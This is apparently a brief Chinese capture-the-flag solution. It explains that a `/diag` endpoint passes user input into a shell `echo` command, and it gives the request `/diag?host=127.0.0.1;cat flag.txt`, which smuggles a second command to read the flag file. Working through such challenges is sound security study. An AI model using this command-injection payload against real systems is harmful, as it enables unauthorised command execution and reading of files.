# 解法

`/diag` 直接执行 `echo checking ` 加上用户输入，因此用 `; cat flag.txt` 就能把读取命令接进去。请求 `/diag?host=127.0.0.1;cat flag.txt` 即可。
